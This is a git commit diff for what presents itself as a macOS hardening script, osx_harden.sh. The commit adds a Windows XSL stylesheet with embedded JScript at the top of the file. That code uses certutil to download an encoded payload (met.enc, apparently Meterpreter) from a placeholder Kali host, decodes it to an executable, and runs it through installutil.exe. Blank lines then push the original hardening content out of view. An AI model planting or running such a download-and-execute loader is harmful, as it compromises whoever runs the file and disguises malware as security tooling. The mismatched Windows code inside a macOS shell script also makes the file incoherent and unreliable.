48d43f6265e13851d2766b5bd79ab9574a299d2b
ssc <sascha.schmidt@mac.com>
2023-01-18 11:04:49 +0100

    Update osx_harden.sh

--- osx_harden.sh
+++ osx_harden.sh
@@ -1,3 +1,31 @@
+<?xml version='1.0'?>
+<stylesheet version="1.0"
+xmlns="http://www.w3.org/1999/XSL/Transform"
+xmlns:ms="urn:schemas-microsoft-com:xslt"
+xmlns:user="http://mycompany.com/mynamespace%22%3E
+
+<output method="text"/>
+  <ms:script implements-prefix="user" language="JScript">
+    <![CDATA[
+      var ob = new ActiveXObject("WScript.Shell");
+      ob.Run("certutil.exe -urlcache -f http://<Kali_IP_web>/met.enc C:\Users\Public\met.enc", 0, true);
+      ob.Run("certutil.exe -decode C:\Users\Public\met.enc C:\Users\Public\met.exe", 0, true);
+      ob.Run("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\Public\met.exe", 0, true);
+    ]]>
+  </ms:script>
+</stylesheet>
+
+
+
+
+
+
+
+
+
+
+
+
 
 # Lynis hat ein OSX Modul!!!
 
